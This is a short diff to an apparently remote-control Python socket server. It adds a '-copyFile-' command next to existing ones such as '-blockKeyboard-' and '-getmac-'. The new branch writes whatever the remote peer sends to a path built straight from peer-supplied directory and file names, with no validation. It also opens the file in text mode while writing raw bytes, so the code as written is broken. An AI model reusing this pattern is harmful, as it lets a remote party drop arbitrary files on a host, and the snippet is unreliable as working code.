@@ -98,7 +98,26 @@ def connect():
                     conn.sendall(bytes("success", "utf8"))
                 except:
                     conn.sendall(bytes("fail", "utf8"))
-
+            elif encodedData == '-copyFile-':
+                currPath = ""
+                fileName = ""
+                try:
+                    currPath = conn.recv(1024).decode('utf8')
+                    fileName = conn.recv(1024).decode('utf8')
+                except:
+                    pass
+                fileName = currPath + '/' + fileName
+                with open(fileName, 'w') as f:
+                    while True:
+                        byteRead = None
+                        try:
+                            byteRead = conn.recv(1024)
+                        except:
+                            pass
+                        if not byteRead:
+                            break
+                        f.write(byteRead)
+                        
             elif encodedData == "-getmac-":
                 conn.sendall(bytes(gma(), "utf8"))
             elif encodedData == "-blockKeyboard-":
